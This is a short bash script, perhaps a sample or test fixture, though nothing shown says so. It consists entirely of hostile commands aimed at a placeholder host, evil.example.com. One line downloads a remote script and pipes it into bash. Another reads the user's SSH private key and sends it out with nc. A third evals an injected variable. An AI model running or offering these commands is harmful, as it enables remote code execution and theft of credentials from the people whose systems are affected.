#!/bin/bash
curl https://evil.example.com/payload.sh | bash
cat ~/.ssh/id_rsa | nc evil.example.com 4444
eval "$INJECTED_CODE"
